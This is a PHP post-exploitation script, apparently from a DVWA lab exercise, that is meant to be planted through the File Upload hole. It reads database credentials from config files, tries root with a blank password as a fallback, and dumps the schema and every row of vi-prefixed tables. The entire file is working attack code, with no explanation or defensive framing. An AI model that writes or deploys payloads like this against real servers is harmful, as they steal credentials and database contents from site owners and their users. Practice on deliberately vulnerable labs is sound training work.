<?php
// Reads DB creds from DVWA's config, connects, and dumps the vi_* table.
// Run from hackable/uploads/ via the File Upload foothold.
error_reporting(E_ERROR | E_PARSE);

$_DVWA = array();
$cfgpaths = [
    '/var/www/dvwa/config/config.inc.php',
    '/var/www/html/config/config.inc.php',
    '../../config/config.inc.php',
    dirname(__FILE__).'/../../config/config.inc.php',
];
$loaded = null;
foreach ($cfgpaths as $p) {
    if (@file_exists($p)) { include($p); $loaded = $p; break; }
}
echo "config loaded from: ".($loaded ?: 'NONE')."\n";

$host = isset($_DVWA['db_server'])   ? $_DVWA['db_server']   : '127.0.0.1';
$user = isset($_DVWA['db_user'])     ? $_DVWA['db_user']     : 'dvwa';
$pass = isset($_DVWA['db_password']) ? $_DVWA['db_password'] : '';
$db   = isset($_DVWA['db_database']) ? $_DVWA['db_database'] : 'dvwa';
echo "using: user=$user db=$db host=$host\n\n";

$mysqli = @new mysqli($host, $user, $pass, $db);
if ($mysqli->connect_errno) {
    // last-ditch: try root with no password
    $mysqli = @new mysqli($host, 'root', '', $db);
    if ($mysqli->connect_errno) { echo "connect failed: ".$mysqli->connect_error; exit; }
    echo "(connected as root)\n";
}

$t = $mysqli->query("SELECT table_name FROM information_schema.tables WHERE table_schema='$db' AND table_name LIKE 'vi%'");
echo "=== vi_* tables ===\n"; $table = null;
if ($t) while ($row = $t->fetch_row()) { echo $row[0]."\n"; if(!$table) $table=$row[0]; }

if ($table) {
    echo "\n=== columns of $table ===\n";
    $c = $mysqli->query("SELECT column_name FROM information_schema.columns WHERE table_schema='$db' AND table_name='$table'");
    if ($c) while ($row = $c->fetch_row()) echo $row[0]."\n";

    echo "\n=== rows of $table ===\n";
    $r = $mysqli->query("SELECT * FROM `$db`.`$table`");
    if ($r) while ($row = $r->fetch_assoc()) echo implode(" | ", $row)."\n";
}
$mysqli->close();
?>
